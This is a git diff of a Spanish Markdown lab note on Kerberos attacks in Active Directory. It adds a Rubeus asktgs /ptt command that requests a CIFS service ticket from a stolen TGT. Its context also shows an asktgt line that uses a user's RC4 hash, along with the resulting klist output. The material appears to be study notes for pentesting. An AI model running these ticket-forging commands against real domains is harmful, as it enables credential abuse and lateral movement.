@@ -118,12 +118,6 @@ C:\AD\Tools\Rubeus.exe asktgt /user:juan /domain:cs.org /rc4:709d4242de780b1f34c
 ```
 Al listar el *ticket*, solo se tendrá el recién importado:
 ```powershell
-PS C:\Users\ffff> klist
-
-Current LogonId is 0:0x7f0cb
-
-Cached Tickets: (1)
-
 #0>     Client: juan @ CS.ORG
         Server: krbtgt/cs.org @ CS.ORG
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
@@ -150,14 +144,11 @@ Al consumir el servicio CIF, se creará el TGS, Windows hará el trabajo.
         Kdc Called: SERVER-01.cs.org
 ```
 
-Creando el TGS manualmente:
+Creando el TGS manualmente para consumir el sercio CIF:
 
-PS C:\Users\pepe.CS> klist
-
-Current LogonId is 0:0x2cf2cb
-
-Cached Tickets: (1)
-
+```powershell
+C:\AD\Tools\Rubeus.exe asktgs /ticket:doIFDj... /service:cifs/server-01.cs.org /ptt
+# Al listar el *ticket* creado:
 #0>     Client: juan @ CS.ORG
         Server: cifs/server-01.cs.org @ CS.ORG
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
@@ -168,3 +159,5 @@ Cached Tickets: (1)
         Session Key Type: AES-256-CTS-HMAC-SHA1-96
         Cache Flags: 0
         Kdc Called:
+```
+
